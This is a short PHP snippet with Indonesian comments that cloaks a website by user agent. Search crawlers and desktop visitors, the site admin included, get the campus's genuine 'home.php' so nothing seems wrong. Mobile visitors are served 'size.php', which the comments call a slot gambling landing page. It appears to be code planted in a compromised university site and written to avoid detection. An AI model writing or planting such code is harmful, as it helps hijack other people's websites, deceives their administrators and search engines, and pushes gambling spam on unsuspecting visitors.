// Jika robot Google atau crawler lain yang datang
if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false || stripos($user_agent, 'crawl') !== false) {
    include('home.php');  // Berikan konten asli kampus agar aman
} 
// Jika user asli menggunakan HP/Mobile
elseif ($is_mobile) {
    include('size.php');  // Berikan Landing Page Slot Anda
} 
// Jika user dari desktop (termasuk admin web)
else {
    include('home.php');  // Tetap berikan konten asli kampus agar tidak curiga
}
